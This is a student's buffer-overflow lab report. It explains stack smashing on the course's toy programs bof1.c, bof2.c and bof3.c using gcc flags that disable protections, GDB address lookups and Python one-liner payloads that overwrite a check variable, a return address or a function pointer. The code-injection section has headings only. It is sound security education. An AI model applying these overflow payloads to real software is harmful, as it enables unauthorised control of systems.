# 21110073 Le Bui Huu Phuc
# Lab #1: Buffer Overflow
# Task 1: Stack smashing by memory overwritten
## 1.1. bof1.c
- Compile the program using the following command:
![img1.1](https://github.com/neptuneizme/Report_InformationSecurityLab/blob/fd7842bc5625ec9590414f935437903fb41a70d5/A%CC%89nh%20ma%CC%80n%20hi%CC%80nh%202024-06-27%20lu%CC%81c%2020.02.43.png)
- This command disables stack protection and sets the boundary.
![img1.2](https://github.com/neptuneizme/Report_InformationSecurityLab/blob/main/img/bof1.2.png?raw=true)
- Use the GDB command disas to get the address of push ebp in the secretFunc() function. The address obtained is:
![img1.3](https://github.com/neptuneizme/Report_InformationSecurityLab/blob/main/img/bof1.3.png?raw=true)
- 0x0804846b
- Create the input payload using Python and execute the program with the crafted input:
![img1.3](https://github.com/neptuneizme/Report_InformationSecurityLab/blob/main/img/bof1.4.png?raw=true)
- Here, the address 0x0804846b is appended to the payload, and ./bof1.o is executed with 1 as the argument.
## 1.2. bof2.c
- Crafting the Payload
+ Create a string that is 44 bytes long, where the first 40 bytes fill buf, and the next 4 bytes overwrite check with 0xdeadbeef. Python command to generate such a payload:
```python python -c "print('A'*40 + '\xef\xbe\xad\xde')" > input.txt ```
- Compile the Program:
```python gcc bof2.c -o bof2.o -fno-stack-protector -z execstack -mpreferred-stack-boundary=2```
- Run the Program:
``` ./bof1.o < input.txt```
![img2.1](https://github.com/neptuneizme/Report_InformationSecurityLab/blob/main/img/bof2.1.png?raw=true)
## 1.3. bof3.c
### Key Points:
+ Buffer Definition: char buf[128]; creates a buffer of 128 bytes.
+ Function Pointer: void (*func)() = sup; initializes func to point to the sup function.
+ Buffer Overflow: fgets(buf, 133, stdin); reads up to 132 characters into buf, which can overflow the buffer and overwrite adjacent memory, including the func pointer.
+ Function Call: func(); calls the function pointed to by func.
### Exploitation Strategy
- Overflow buf to overwrite the func pointer with the address of the shell function.
- Ensure that after the overflow, func points to shell.
### Steps to Exploit
+ Find the Address of the shell Function: ``` gcc bof3.c -o bof3.o -fno-stack-protector -z execstack -mpreferred-stack-boundary=2```
![img](https://github.com/neptuneizme/Report_InformationSecurityLab/blob/main/img/bof3.1.png?raw=true)
- Compile the program with debug information: ```gdb bof3.o
(gdb) disas shell```
### Determine the Offset:
- Since buf is 128 bytes and func is immediately after buf, the offset to overwrite func will be 128 bytes.
### Create the Payload:

- The payload should be 128 bytes of filler followed by the address of shell.
- Use Python to create the payload: ```python -c "print('A'*128 + '\x5b\x84\x04\x08')" > input.txt```
### Run the Program:
```./bof3.o < input.txt```
# Task 2: Code injection
## 2.1. Preparing shell code
## 2.2. Preparing the payload
## 2.3. Code injection
